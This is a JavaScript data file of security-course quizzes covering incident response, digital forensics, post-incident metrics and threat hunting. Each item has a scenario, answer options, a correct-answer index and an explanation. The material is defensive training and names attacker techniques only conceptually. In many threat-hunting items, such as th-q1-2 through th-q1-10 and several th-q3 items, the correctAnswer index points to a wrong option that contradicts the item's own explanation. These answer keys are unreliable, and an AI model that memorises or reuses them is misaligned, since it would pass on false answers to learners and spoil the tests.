                  "This is a governance decision requiring pre-defined authority: 'monitor mode' only under written approval, hard time-box, defined exit criteria, and continuous safety review — otherwise contain",
                  "Always contain immediately",
                  "Ask the attacker to stop"
              ],
              correctAnswer: 1,
              explanation: "Extended monitoring carries real risk (spread, exfil, liability). It requires pre-authorized written approval, containment tripwires, and continuous risk reassessment. Absent that governance, the default must be containment."
          },
          {
              id: "ir-q4-9",
              difficulty: "hard",
              tags: [
                  "Ransomware Recovery"
              ],
              scenario: "Ransomware has encrypted 40% of file shares. Backups exist. Business asks whether they should also pay 'as insurance'.",
              question: "What is the most defensible advisory?",
              options: [
                  "Always pay",
                  "Pay decisions carry OFAC/sanctions risk, no delivery guarantee, tax on future targets, and no assurance of eradication — decision is legal/executive with counsel; technically, prioritize proven, tested restore from clean backups",
                  "Never document",
                  "Pay only in crypto"
              ],
              correctAnswer: 1,
              explanation: "Payment is a legal/executive decision with sanctions (OFAC), insurance, disclosure, and re-victimization implications. IR's role is to enable a clean, tested restore path AND close the initial vector so payment (if made) doesn't just fund the next attack on you."
          },
          {
              id: "ir-q4-10",
              difficulty: "hard",
              tags: [
                  "Recovery Validation"
              ],
              scenario: "Systems are 'recovered'. Someone asks how you know the environment is clean.",
              question: "What is a defensible validation?",
              options: [
                  "AV scan returned clean",
                  "Multi-signal validation: fresh IOC sweep, retro-hunt against last 30–90 days of telemetry, EDR re-baseline, network egress review, identity anomaly monitoring, tabletop-style red-team probes, plus a defined heightened-monitoring period",
                  "Users report no issues",
                  "The malware family scanner shows nothing"
              ],
              correctAnswer: 1,
              explanation: "Recovery validation is a program, not a single scan: IOC + behavior sweeps across historical telemetry, identity checks, egress review, and an explicit heightened-monitoring window before declaring the incident closed."
          }
      ]
  },
  {
      quizId: "ir-q5",
      courseId: "incident-response",
      title: "Digital Forensics & Evidence Handling",
      description: "Scenario-based DFIR: acquisition, chain of custody, memory/disk artifacts, and defensible analysis.",
      passingScore: 70,
      timeLimit: 25,
      questions: [
          {
              id: "ir-q5-1",
              difficulty: "easy",
              tags: [
                  "Order of Volatility",
                  "RFC 3227"
              ],
              scenario: "You arrive at a running suspect host. You can only capture one artifact class before shutdown.",
              question: "Which do you capture first per RFC 3227?",
              options: [
                  "Disk image",
                  "Memory (RAM) — highest volatility; contains process state, encryption keys, network connections, injected code, and cleartext creds lost on power-off",
                  "Registry export",
                  "Event logs"
              ],
              correctAnswer: 1,
              explanation: "Order of volatility (RFC 3227): CPU/registers → RAM → network state → running processes → disk → archival. Memory captures ephemeral evidence (keys, injected code, LSASS) that vanishes at shutdown."
          },
          {
              id: "ir-q5-2",
              difficulty: "easy",
              tags: [
                  "Hashing",
                  "Integrity"
              ],
              scenario: "You image a 2 TB drive. What must you record to prove integrity later?",
              question: "Correct answer?",
              options: [
                  "File size only",
                  "Cryptographic hash (SHA-256 recommended) of source and image, computed with a write-blocker in place, logged with acquirer, timestamp, tool, and version",
                  "MD5 without documentation",
                  "Nothing — the imaging tool handles it"
              ],
              correctAnswer: 1,
              explanation: "Evidentiary integrity requires pre- and post-acquisition hashes (SHA-256), write-blocking, and a full acquisition log (who/when/tool/version). MD5 alone is discouraged; undocumented hashes are worthless in dispute."
          },
          {
              id: "ir-q5-3",
              difficulty: "medium",
              tags: [
                  "Chain of Custody"
              ],
              scenario: "An imaged drive moves: analyst A → evidence locker → analyst B → external counsel. No log is kept.",
              question: "What is the consequence?",
              options: [
                  "None if the hash matches",
                  "Chain of custody is broken; opposing counsel can challenge admissibility and weight — even valid hashes cannot cure missing custody",
                  "Only affects criminal cases",
                  "The evidence is auto-destroyed"
              ],
              correctAnswer: 1,
              explanation: "Chain of custody is a documented, unbroken trail (who had it, when, why, where, how transferred). Hashes prove file integrity, not custody integrity. Both are required for defensible use."
          },
          {
              id: "ir-q5-4",
              difficulty: "medium",
              tags: [
                  "Memory Forensics",
                  "Volatility"
              ],
              scenario: "In a memory image you see: explorer.exe → cmd.exe → powershell.exe → rundll32.exe with a suspicious network connection, and an injected private memory region in lsass.exe.",
              question: "What is the most likely finding?",
              options: [
                  "Benign IT activity",
                  "Interactive intrusion with credential access (LSASS injection consistent with mimikatz-style dumping) — priority artifact for triage",
                  "Automated software update",
                  "Antivirus scan"
              ],
              correctAnswer: 1,
              explanation: "Interactive process ancestry from explorer, unusual rundll32 network activity, and RWX-injected regions in LSASS are classic credential-access patterns. Volatility/Volatility3 plugins (malfind, hollowfind, ldrmodules, netscan) confirm."
          },
          {
              id: "ir-q5-5",
              difficulty: "medium",
              tags: [
                  "Disk Artifacts"
              ],
              scenario: "You need to prove a user opened a specific file on a Windows 10 host.",
              question: "Which artifact set is most defensible?",
              options: [
                  "Recycle bin only",
                  "MFT + $LogFile/$UsnJrnl + Shellbags + LNK files + Jumplists + Prefetch + RecentDocs + browser/Office MRU — corroborate across multiple artifact classes",
                  "The file's last-modified time only",
                  "System reboot log"
              ],
              correctAnswer: 1,
              explanation: "Windows records user activity across many artifact classes. Defensible attribution corroborates across MFT, USN, Shellbags, LNK/Jumplists, Prefetch, and application MRUs — no single artifact is sufficient."
          },
          {
              id: "ir-q5-6",
              difficulty: "medium",
              tags: [
                  "Timeline Analysis"
              ],
              scenario: "You need to reconstruct 'what happened between 14:00 and 14:30' on a Windows server.",
              question: "Best approach?",
              options: [
                  "Guess from AV logs",
                  "Build a super-timeline (e.g., Plaso/log2timeline) combining MFT, event logs, registry, prefetch, browser, EDR, and network logs — normalized to UTC",
                  "Read the AV log only",
                  "Rely on user memory"
              ],
              correctAnswer: 1,
              explanation: "Super-timelines fuse artifact classes into one time-ordered view (UTC), which is the only way to reconstruct attacker sequencing across process, filesystem, registry, and network layers."
          },
          {
              id: "ir-q5-7",
              difficulty: "hard",
              tags: [
                  "Anti-Forensics"
              ],
              scenario: "An attacker cleared Windows event logs (EID 1102). You need to reconstruct activity.",
              question: "Which sources survive log clearing?",
              options: [
                  "None",
                  "USN journal, $LogFile, prefetch, shimcache/amcache, registry hives (SYSTEM, SOFTWARE, NTUSER), EDR/SIEM copies, network telemetry (Zeek/firewall/proxy), and backup event logs — plus the 1102 event itself is forensically valuable",
                  "Only the current event log",
                  "Only the recycle bin"
              ],
              correctAnswer: 1,
              explanation: "Windows leaves parallel records outside the security log: filesystem journals, execution artifacts (Prefetch, Amcache, Shimcache), registry, and remote/EDR copies. Central log forwarding + EDR are the strongest anti-anti-forensics investments."
          },
          {
              id: "ir-q5-8",
              difficulty: "hard",
              tags: [
                  "Cloud Forensics"
              ],
              scenario: "The compromised asset is an AWS EC2 instance. The IR team's laptop-forensics playbook doesn't apply.",
              question: "What is the correct cloud-native approach?",
              options: [
                  "SSH in and run tools live",
                  "Snapshot EBS volumes, capture memory via SSM/agent, isolate via security-group swap, preserve CloudTrail/GuardDuty/VPC Flow, then analyze from a forensics VPC — no live changes on the victim",
                  "Terminate the instance first",
                  "Wait for AWS support"
              ],
              correctAnswer: 1,
              explanation: "Cloud DFIR uses provider primitives: EBS snapshots (immutable, hash-verified), memory capture via SSM/agent, network isolation via SG replacement, and control-plane logs (CloudTrail/GuardDuty/Flow Logs) — investigation happens in an isolated forensics VPC, not on the victim."
          },
          {
              id: "ir-q5-9",
              difficulty: "hard",
              tags: [
                  "Malware Triage"
              ],
              scenario: "You recover a suspicious PE. Detonating on a personal laptop feels fastest.",
              question: "Why is that wrong?",
              options: [
                  "It's fine if AV is on",
                  "Malware must be handled in an isolated, instrumented sandbox (network-isolated or C2-simulated, snapshotted VM) with proper handling procedures — laptop detonation risks infection, data loss, and evidence contamination",
                  "Personal laptops are safer",
                  "Only .exe files are dangerous"
              ],
              correctAnswer: 1,
              explanation: "Analysis requires isolated, instrumented environments (Cuckoo/Any.Run/CAPE, snapshotted VMs, INetSim/FakeNet) with defined handling procedures. Ad-hoc detonation risks host infection, C2 callback, evidence contamination, and legal exposure."
          },
          {
              id: "ir-q5-10",
              difficulty: "hard",
              tags: [
                  "Attribution"
              ],
              scenario: "After analysis, someone asks: 'Which nation-state actor did this?'",
              question: "What is the most defensible response?",
              options: [
                  "Name a group publicly",
                  "Attribution is high-confidence only with converging evidence (TTPs, infrastructure, code lineage, timing/geopolitics, human intel) and is generally beyond a single victim's dataset — report observed behavior mapped to ATT&CK; leave named-actor attribution to vendors/government",
                  "Blame the loudest headline group",
                  "Refuse to write anything"
              ],
              correctAnswer: 1,
              explanation: "Defensible attribution combines TTPs, infrastructure, code overlap, tradecraft, and non-technical signals. Most enterprises lack the datasets. Reports should describe behavior/ATT&CK mapping; named-actor claims belong to specialized vendors and government."
          }
      ]
  },
  {
      quizId: "ir-q6",
      courseId: "incident-response",
      title: "Post-Incident, Metrics & Continuous Improvement",
      description: "Scenario-based post-incident: blameless reviews, reporting, metrics that matter, and turning incidents into durable improvement.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q6-1",
              difficulty: "easy",
              tags: [
                  "Blameless Post-Mortem"
              ],
              scenario: "In the lessons-learned meeting, the CIO opens with: 'Whose fault was this?'",
              question: "How should the facilitator reframe?",
              options: [
                  "Answer with a name",
                  "Redirect to a blameless format: 'Which decisions made sense with the information available, and which system/process changes would make the right decision easier next time?'",
                  "Cancel the meeting",
                  "Blame the vendor"
              ],
              correctAnswer: 1,
              explanation: "Blameless reviews (Google/Etsy tradition) surface systemic root causes because participants stop defending themselves. Naming individuals kills future candor, guarantees repeat incidents, and produces action items nobody will own honestly."
          },
          {
              id: "ir-q6-2",
              difficulty: "easy",
              tags: [
                  "Timing"
              ],
              scenario: "When should the lessons-learned meeting occur?",
              question: "Best window and why?",
              options: [
                  "Immediately after containment while adrenaline is high",
                  "Within ~2 weeks of closure — recent enough for accurate recall, distant enough for perspective and a written timeline",
                  "During the next annual audit",
                  "Never — retros are optional"
              ],
              correctAnswer: 1,
              explanation: "Two weeks balances recall fidelity with reflection. Immediate reviews mix trauma with analysis; delayed reviews lose context and momentum on action items."
          },
          {
              id: "ir-q6-3",
              difficulty: "medium",
              tags: [
                  "Action Items"
              ],
              scenario: "The retro produces 22 action items. Six months later, 3 are done and the rest are 'in progress'.",
              question: "Which structural fix helps most?",
              options: [
                  "Cancel retros",
                  "Every action item requires a named single owner, a deadline, clear acceptance criteria, and a monthly review with executive visibility — tracked like any other engineering commitment",
                  "Add more action items",
                  "Assign to 'the team'"
              ],
              correctAnswer: 1,
              explanation: "Action items without owner/deadline/acceptance/executive visibility are wishes. Program-level tracking (with escalation) is what turns lessons into durable improvement — this is the difference between mature and cosmetic post-mortems."
          },
          {
              id: "ir-q6-4",
              difficulty: "medium",
              tags: [
                  "Metrics",
                  "MTTD/MTTR"
              ],
              scenario: "Your MTTD is trending upward for two quarters.",
              question: "Where do you invest?",
              options: [
                  "Faster containment tools",
                  "Detection coverage and quality: ATT&CK gap analysis, telemetry coverage (endpoint/identity/cloud), rule precision, threat-informed hunting, tuning of noisy rules",
                  "More marketing",
                  "Reduce logging"
              ],
              correctAnswer: 1,
              explanation: "MTTD is bounded by what you can see and how well you can see it. Fix telemetry gaps, ATT&CK coverage, and detection quality (precision/recall) before adding response horsepower — you cannot respond to what you cannot detect."
          },
          {
              id: "ir-q6-5",
              difficulty: "medium",
              tags: [
                  "Dwell Time"
              ],
              scenario: "Which metric best captures 'how long the attacker had free run of the environment'?",
              question: "Pick and justify.",
              options: [
                  "MTTR",
                  "Dwell time — initial compromise to eradication; the single most business-relevant intrusion metric because it correlates with blast radius, exfil volume, and cost",
                  "Alert count",
                  "MTBF"
              ],
              correctAnswer: 1,
              explanation: "Dwell time (compromise → eradication) integrates detection AND response effectiveness and is the metric most correlated with breach cost and scope. Industry reports (Mandiant, IBM) track it as the north-star."
          },
          {
              id: "ir-q6-6",
              difficulty: "medium",
              tags: [
                  "Executive Reporting"
              ],
              scenario: "You draft an incident report starting with: 'On host WKS-4471 we observed rundll32.exe executing a DLL from %AppData%…'",
              question: "What's wrong for the executive summary?",
              options: [
                  "Nothing",
                  "Executive Summary must be business-language: what happened, business impact, data involved, actions taken, current status, top recommendations — technical detail belongs later in the report",
                  "Add more commands",
                  "Remove all timestamps"
              ],
              correctAnswer: 1,
              explanation: "Executive summaries answer: what, so-what, now-what — in business terms. Technical detail lives in the analysis section for the technical audience. Mixing the two loses both audiences."
          },
          {
              id: "ir-q6-7",
              difficulty: "hard",
              tags: [
                  "Re-compromise Rate"
              ],
              scenario: "Six months after the incident, the same threat actor is back via a different but related vector.",
              question: "What does this indicate and how do you measure it?",
              options: [
                  "Bad luck",
                  "Incomplete eradication or unaddressed root cause. Track 're-compromise rate' (repeat intrusions by same actor/vector/family within a defined window) as a leading indicator of eradication quality",
                  "Attacker skill",
                  "Nothing measurable"
              ],
              correctAnswer: 1,
              explanation: "Re-compromise rate is the sharpest measure of eradication + root-cause quality. Rising rate = you're treating symptoms. It should be reviewed alongside MTTD/MTTR/dwell."
          },
          {
              id: "ir-q6-8",
              difficulty: "hard",
              tags: [
                  "Timestamps",
                  "Correlation"
              ],
              scenario: "Different systems in your report show times in EST, IST, and UTC. Correlating events becomes error-prone.",
              question: "What standard should reports use?",
              options: [
                  "Analyst's local time",
                  "All timestamps in UTC (ISO 8601, e.g., 2026-01-14T14:02:31Z); optionally show local time in parentheses. Enforce clock sync (NTP) as a Preparation requirement",
                  "Local time of each server",
                  "Whatever the SIEM shows"
              ],
              correctAnswer: 1,
              explanation: "UTC + ISO 8601 is the only defensible standard for multi-system, multi-region correlation and legal reporting. Reliable time also requires enforced NTP/PTP across sources — a Preparation-phase control."
          },
          {
              id: "ir-q6-9",
              difficulty: "hard",
              tags: [
                  "Improvement Categories"
              ],
              scenario: "Retro produces: (a) 'Deploy EDR to 400 uncovered Linux hosts', (b) 'Add krbtgt rotation playbook branch', (c) 'Train Tier-1 on Kerberos abuse'.",
              question: "Classify each into People / Process / Technology.",
              options: [
                  "All Technology",
                  "a = Technology (coverage), b = Process (playbook), c = People (training) — a healthy retro produces items across all three categories",
                  "All Process",
                  "Only People matters"
              ],
              correctAnswer: 1,
              explanation: "Balanced improvement portfolios span People, Process, and Technology. Retros dominated by one category (usually 'buy a tool') indicate weak root-cause analysis and predict recurrence."
          },
          {
              id: "ir-q6-10",
              difficulty: "hard",
              tags: [
                  "Maturity"
              ],
              scenario: "Leadership asks: 'When do we become a metrics-driven IR program?'",
              question: "Best framing?",
              options: [
                  "When we buy a dashboard",
                  "At CMMI Level 4 (Quantitatively Managed): processes are defined (Level 3), instrumented, and *decisions* are driven by measured performance — the shift is behavioral, not tooling",
                  "When we hire more analysts",
                  "Never — IR can't be measured"
              ],
              correctAnswer: 1,
              explanation: "CMMI Level 4 requires that processes exist (Level 3) AND that quantitative data drives management decisions. Dashboards without decision authority ≠ metrics-driven. The distinguishing behavior is: 'we changed X because the metric said Y'."
          }
      ]
   },
   {
    quizId: "th-q1",
    courseId: "threat-hunting",
    title: "Hunting Methodology & Frameworks",
    description: "Test your understanding of threat hunting methodology, the Hunting Maturity Model, and hypothesis-driven hunting.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q1-1", question: "What is the primary difference between threat hunting and traditional detection?", options: ["Hunting is proactive and hypothesis-driven, searching without waiting for alerts", "Hunting uses automated SIEM alerts as its only source of investigation leads", "Hunting replaces SIEM detection rules entirely and requires no alert tuning", "Hunting focuses on compliance reporting and regulatory audit requirements"], correctAnswer: 0, explanation: "Threat hunting is proactive — analysts form hypotheses and actively search for threats rather than waiting for alerts." },
      { id: "th-q1-2", question: "How many levels does the Hunting Maturity Model (HMM) define?", options: ["Three levels covering initial, developing, and advanced hunting capability", "Four levels covering reactive, procedural, analytical, and continuous hunting", "Five levels: HM0 (Initial), HM1 (Minimal), HM2 (Procedural), HM3 (Innovative), and HM4 (Leading)", "Six levels including a specialized cloud-hunting tier for modern environments"], correctAnswer: 1, explanation: "The HMM defines 5 levels: HM0 (Initial), HM1 (Minimal), HM2 (Procedural), HM3 (Innovative), and HM4 (Leading)." },
      { id: "th-q1-3", question: "At which HMM level does an organization begin routine data collection but lacks structured hunting?", options: ["HM0 — no structured data collection or hunting capability exists at this stage", "HM1 — data is collected routinely but hunting is ad-hoc and indicator-dependent", "HM2 — procedural hunts follow documented playbooks and existing threat reports", "HM3 — hunters create custom analytical techniques and automation frameworks"], correctAnswer: 2, explanation: "HM1 (Minimal) means the org collects data routinely but hunting is ad-hoc and relies on indicators." },
      { id: "th-q1-4", question: "What is the first step of hypothesis-driven hunting?", options: ["Collect all available evidence before forming any analytical conclusions", "Write a final incident report summarizing findings and stakeholder impact", "Formulate a testable hypothesis based on threat intelligence or anomaly data", "Deploy new tooling to expand log coverage before any investigation starts"], correctAnswer: 3, explanation: "Hypothesis-driven hunting begins with a testable hypothesis based on threat intelligence, experience, or anomaly patterns." },
      { id: "th-q1-5", question: "Which of the following is a characteristic of a good hunting hypothesis?", options: ["It is as vague as possible to allow broad coverage across many threat types", "It is testable, falsifiable, specific, and grounded in threat intel or data patterns", "It requires no supporting data and relies entirely on analyst intuition alone", "It is based solely on gut feeling without reference to any framework or evidence"], correctAnswer: 0, explanation: "A good hypothesis is specific, testable, falsifiable, and grounded in threat intelligence or data patterns." },
      { id: "th-q1-6", question: "What does 'TTP' stand for in the context of threat hunting?", options: ["Total Threat Prevention — a layered security strategy for blocking all known attacks", "Threat Tracking Protocol — a communication standard for sharing IOCs across teams", "Triage, Test, and Publish — the SOC workflow for validating new alert signatures", "Tactics, Techniques, and Procedures — adversary behavioral patterns mapped in ATT&CK"], correctAnswer: 1, explanation: "TTP stands for Tactics, Techniques, and Procedures — the behavioral patterns of adversaries mapped in frameworks like MITRE ATT&CK." },
      { id: "th-q1-7", question: "Which hunting approach starts with known threat intelligence indicators?", options: ["Baseline hunting — establishes what normal looks like and searches for deviations", "Anomaly-based hunting — uses statistical models to surface unusual outlier behavior", "Intel-driven hunting — uses known IOCs, TTPs, or threat reports as starting points", "Compliance hunting — reviews logs to confirm adherence to regulatory control requirements"], correctAnswer: 2, explanation: "Intel-driven hunting uses known IOCs, TTPs, or threat reports as starting points for investigation." },
      { id: "th-q1-8", question: "What is 'baseline hunting'?", options: ["Hunting specifically for the newest identified malware families using vendor signatures", "Using only signature-based detection rules to surface known attack patterns in the SIEM", "Hunting exclusively during business hours to protect production systems from disruption", "Establishing what normal activity looks like in the environment and hunting for deviations"], correctAnswer: 3, explanation: "Baseline hunting establishes what 'normal' looks like in an environment and then searches for anomalous deviations." },
      { id: "th-q1-9", question: "At HM4 (Leading), what distinguishes the organization?", options: ["No automation — all hunting is performed manually by experienced senior analysts", "Continuous hunting with custom tooling and automation that feeds findings into detections", "Hunting is fully automated with zero human analysts involved in the investigation process", "All hunting is outsourced to an MSSP with no internal team ownership or oversight"], correctAnswer: 0, explanation: "HM4 organizations run continuous hunts with custom tooling and systematically convert findings into automated detections." },
      { id: "th-q1-10", question: "Why should hunt findings be documented even when no threat is found?", options: ["Documentation is optional and only required for confirmed positive threat findings", "To blame analysts for missed threats and track individual performance over time", "To justify headcount and demonstrate team activity to management and stakeholders", "Documenting negative results refines baselines, improves hypotheses, and proves coverage"], correctAnswer: 1, explanation: "Documenting all hunts — including negatives — refines baselines, improves future hypotheses, and demonstrates security coverage." }
    ]
  },
  {
    quizId: "th-q2",
    courseId: "threat-hunting",
    title: "Threat Intelligence for Hunters",
    description: "Assess your knowledge of the Pyramid of Pain, IOC types, and intelligence-driven hunting.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q2-1", question: "In David Bianco's Pyramid of Pain, which indicator is at the top (hardest for adversaries to change)?", options: ["Hash values — a single byte change produces a completely different and undetected hash", "IP addresses — attackers use hosting providers to keep stable C2 infrastructure online", "Domain names — registering lookalike domains takes time and is flagged by threat feeds", "TTPs — behavioral tradecraft requires retooling entire attack chains which is very costly"], correctAnswer: 3, explanation: "TTPs sit at the top — changing behavior and tradecraft is far more costly for adversaries than rotating IPs or hashes." },
      { id: "th-q2-2", question: "Which indicator type is at the bottom of the Pyramid of Pain (easiest for attackers to change)?", options: ["Hash values — a single-bit modification produces a completely different and unblocked hash", "Tools — rebuilding custom malware toolkits is costly and exposes attacker patterns to hunters", "Network artifacts — C2 infrastructure requires setup time and is harder to rotate on demand", "TTPs — behavioral tradecraft is the most painful thing for an attacker to change or abandon"], correctAnswer: 0, explanation: "Hash values are trivial to change — a single-bit modification produces a completely different hash." },
      { id: "th-q2-3", question: "What is a 'Diamond Model' used for in threat intelligence?", options: ["Pricing commercial threat feed subscriptions based on data quality and IOC volume", "Mapping intrusion events across adversary, capability, infrastructure, and victim vertices", "Grading analyst performance based on triage speed and escalation accuracy metrics", "Designing secure network architecture using zero-trust segmentation and layered controls"], correctAnswer: 1, explanation: "The Diamond Model maps intrusion events across four vertices: adversary, capability, infrastructure, and victim." },
      { id: "th-q2-4", question: "What type of IOC is 'c:\\users\\public\\malware.exe'?", options: ["Network indicator showing a suspicious outbound connection to a malicious destination", "Email indicator embedded in a phishing message header or malicious attachment filename", "Behavioral indicator representing a pattern of suspicious system or user activity", "Host-based indicator (file path) pointing to a specific file artifact on an endpoint"], correctAnswer: 3, explanation: "File paths are host-based indicators — they point to specific artifacts on an endpoint." },
      { id: "th-q2-5", question: "Why are IP-based IOCs considered low-value for long-term hunting?", options: ["Adversaries rotate IP addresses frequently and cheaply, making them unreliable over time", "SIEM platforms cannot natively ingest or process raw IP address indicators from threat feeds", "IP indicators cause excessive false negatives because they are too specific for broad detection", "IP addresses are prohibitively expensive for threat intelligence teams to collect at scale"], correctAnswer: 0, explanation: "IP addresses are cheap and easy for attackers to change, making them unreliable for sustained hunting." },
      { id: "th-q2-6", question: "What is 'threat intelligence enrichment'?", options: ["Permanently deleting expired or outdated IOCs from the threat intelligence platform feed", "Encrypting raw threat feeds during transmission to protect confidential source attribution", "Adding context such as reputation, geolocation, WHOIS, and relationships to raw indicators", "Publishing raw IOCs to public sharing platforms like OTX or MISP for community review"], correctAnswer: 2, explanation: "Enrichment adds context like reputation scores, geolocation, WHOIS data, and relationships to raw indicators." },
      { id: "th-q2-7", question: "Which level of threat intelligence is most useful for SOC analysts and hunters?", options: ["Strategic intelligence — high-level geopolitical reporting for executive leadership awareness", "Tactical and operational intelligence — provides actionable IOCs, TTPs, and campaign details", "Political intelligence — covers nation-state policy and diplomatic cyber conflict reporting", "Financial intelligence — tracks cryptocurrency flows and cybercriminal marketplace activity"], correctAnswer: 1, explanation: "Tactical and operational intelligence provides actionable IOCs, TTPs, and campaign details for day-to-day hunting." },
      { id: "th-q2-8", question: "What is a YARA rule used for?", options: ["Monitoring active network traffic flows and flagging suspicious communication patterns", "Enforcing multi-factor authentication policies for privileged identity management systems", "Rotating and managing encryption keys in a PKI infrastructure for certificate issuance", "Pattern-based malware identification by matching string sequences and byte conditions in files"], correctAnswer: 3, explanation: "YARA rules identify malware by matching string patterns, byte sequences, and conditions within files." },
      { id: "th-q2-9", question: "In the Pyramid of Pain, where do 'Tools' fall?", options: ["At the very bottom — tools are the easiest indicator type for adversaries to rotate daily", "In the middle-lower region — tools are slightly harder to change than network artifacts", "In the middle-upper region — replacing custom tooling is costly but not as hard as TTPs", "At the very top — custom tools represent the hardest indicator type for attackers to rebuild"], correctAnswer: 2, explanation: "Tools sit in the middle-upper region — replacing custom tooling is costly but not as hard as changing TTPs." },
      { id: "th-q2-10", question: "What is 'indicator fatigue'?", options: ["A storage capacity problem caused by excessive log retention across too many SIEM data sources", "Hardware performance degradation on SIEM indexers caused by processing too many raw events", "Analysts becoming overwhelmed by excessive low-quality IOCs, reducing their detection effectiveness", "Network bandwidth exhaustion caused by transmitting large threat intelligence feed updates hourly"], correctAnswer: 2, explanation: "Indicator fatigue occurs when analysts are overwhelmed by massive volumes of low-quality IOCs, reducing detection effectiveness." }
    ]
  },
  {
    quizId: "th-q3",
    courseId: "threat-hunting",
    title: "Techniques & Tradecraft",
    description: "Quiz on adversary techniques including LOLBins, JA3 fingerprinting, and evasion methods.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q3-1", question: "What are LOLBins?", options: ["A category of fileless malware designed to operate entirely within system memory", "Legitimate OS binaries like PowerShell and certutil that attackers abuse for malicious actions", "Specialized kernel-level rootkits that hide malicious processes from security monitoring tools", "Open-source penetration testing frameworks used exclusively by red team professionals"], correctAnswer: 1, explanation: "LOLBins (Living Off the Land Binaries) are legitimate system tools like PowerShell, certutil, and mshta abused by attackers." },
      { id: "th-q3-2", question: "Which Windows binary is commonly abused to download files from the internet?", options: ["notepad.exe — the text editor that can open and render HTML from local and remote sources", "calc.exe — the calculator application used to obfuscate encoded payload delivery via DDE", "explorer.exe — the Windows shell that can silently fetch and cache remote file thumbnails", "certutil.exe — has a -urlcache flag attackers abuse to download payloads from remote servers"], correctAnswer: 3, explanation: "certutil.exe has a -urlcache flag that attackers abuse to download payloads from remote servers." },
      { id: "th-q3-3", question: "What does JA3 fingerprinting identify?", options: ["The identity and authentication token of a specific user account during network sessions", "TLS client configuration parameters hashed to uniquely fingerprint applications and tools", "The SHA-256 hash of binary files downloaded over encrypted TLS communication channels", "Email header metadata used to track message routing through mail transfer agent hops"], correctAnswer: 0, explanation: "JA3 creates a hash of TLS client hello parameters, uniquely fingerprinting applications regardless of IP or domain." },
      { id: "th-q3-4", question: "What is 'process hollowing'?", options: ["Completely deleting a running process and its associated threads from system memory", "Creating a legitimate process in suspended state and replacing its memory with malicious code", "Creating new privileged user accounts through the Windows Local Security Authority subsystem", "Clearing Windows Security event logs to erase forensic evidence of administrative activity"], correctAnswer: 2, explanation: "Process hollowing creates a legitimate process in suspended state, replaces its memory with malicious code, then resumes it." },
      { id: "th-q3-5", question: "Which MITRE ATT&CK tactic involves maintaining access after initial compromise?", options: ["Initial Access — the tactic covering initial entry vectors like phishing and exploit delivery", "Persistence — ensures the attacker maintains access across reboots and credential changes", "Exfiltration — covers techniques for stealing and transferring data out of the target network", "Reconnaissance — covers information gathering activities before and during an intrusion"], correctAnswer: 1, explanation: "Persistence ensures the attacker maintains access across reboots, credential changes, or other disruptions." },
      { id: "th-q3-6", question: "What is 'DLL side-loading'?", options: ["The standard Windows process for installing application DLLs in the System32 directory", "Updating existing system DLLs through the Windows Update mechanism to patch vulnerabilities", "Placing a malicious DLL in a location searched before the legitimate path so a program loads it", "Using the Windows compiler to build and register COM-based dynamic link library modules"], correctAnswer: 3, explanation: "DLL side-loading exploits the DLL search order by placing a malicious DLL in a location searched before the legitimate one." },
      { id: "th-q3-7", question: "What is the JA3S hash used for?", options: ["Fingerprinting TLS client hello parameters to identify the application making outbound connections", "Server-side TLS configuration fingerprinting to identify the server stack accepting connections", "Computing cryptographic hashes of DNS query payloads for integrity verification purposes", "Verifying the integrity of downloaded executable files against a known-good reference database"], correctAnswer: 0, explanation: "JA3S fingerprints the server-side TLS hello response, complementing JA3 for full client-server profiling." },
      { id: "th-q3-8", question: "Which technique involves running malicious code entirely in memory without touching disk?", options: ["Fileless malware / in-memory execution, which evades file-based AV and leaves minimal artifacts", "Full disk encryption of operating system volumes using ransomware to prevent forensic access", "Lossless file compression using custom packers to reduce binary size before disk installation", "Standard software installation processes that extract executables from compressed archive files"], correctAnswer: 2, explanation: "Fileless attacks execute entirely in memory, evading traditional file-based antivirus and leaving minimal forensic artifacts." },
      { id: "th-q3-9", question: "What Windows event log is most valuable for detecting LOLBin abuse?", options: ["Application event log — records application-level errors and informational messages from software", "System event log — captures Windows component and driver failures, service start/stop events", "Setup event log — logs Windows Update and component installation and configuration changes", "Sysmon with process creation logging — provides command-line, parent-child, and hash details"], correctAnswer: 3, explanation: "Sysmon provides detailed process creation, command-line, and parent-child relationship logging essential for LOLBin detection." },
      { id: "th-q3-10", question: "What is 'timestomping'?", options: ["Reconfiguring the system time zone to avoid automatic UTC timestamp normalization in SIEM logs", "Modifying file creation and modification timestamps to blend malicious files with legitimate ones", "Configuring NTP servers to synchronize system clocks across distributed logging infrastructure", "Creating time-based correlation alerts in the SIEM to detect scheduled task anomalies"], correctAnswer: 1, explanation: "Timestomping changes file creation/modification times to make malicious files appear as if they've existed longer, evading timeline analysis." }
    ]
  },
  {
    quizId: "th-q4",
    courseId: "threat-hunting",
    title: "Endpoint Hunting",
    description: "Test your skills in hunting for threats on endpoints using process trees, autoruns, and memory analysis.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      { id: "th-q4-1", question: "What is the most important artifact to examine when hunting on endpoints?", options: ["Desktop wallpaper and user interface personalization settings for anomaly detection", "Process execution and parent-child relationships, revealing suspicious spawn chains", "Screen resolution and display scaling settings configured in user profile preferences", "Installed fonts and language pack configurations imported during system provisioning"], correctAnswer: 1, explanation: "Process trees reveal anomalous parent-child relationships, like Word spawning PowerShell, which indicate malicious activity." },
      { id: "th-q4-2", question: "Which parent process spawning cmd.exe is suspicious?", options: ["explorer.exe — the normal Windows shell that legitimately spawns cmd.exe for user tasks", "services.exe — the Windows Service Control Manager which manages all background services", "winword.exe — Microsoft Word spawning cmd.exe is highly suspicious macro-based execution", "cmd.exe — a cmd.exe spawning another cmd.exe for chained scripting is routine behavior"], correctAnswer: 2, explanation: "Microsoft Word (winword.exe) spawning cmd.exe is highly suspicious — it suggests macro-based malware execution." },
      { id: "th-q4-3", question: "What are 'autoruns' in the context of endpoint hunting?", options: ["Automatic software update mechanisms that download patches from vendor update servers", "Scheduled scan configurations that trigger automated malware analysis at preset intervals", "Auto-reply email rules configured in Outlook for out-of-office message automation", "Persistence mechanisms such as registry keys and startup entries that execute code at login"], correctAnswer: 3, explanation: "Autoruns are registry keys, startup folders, scheduled tasks, and services that execute automatically — common persistence locations." },
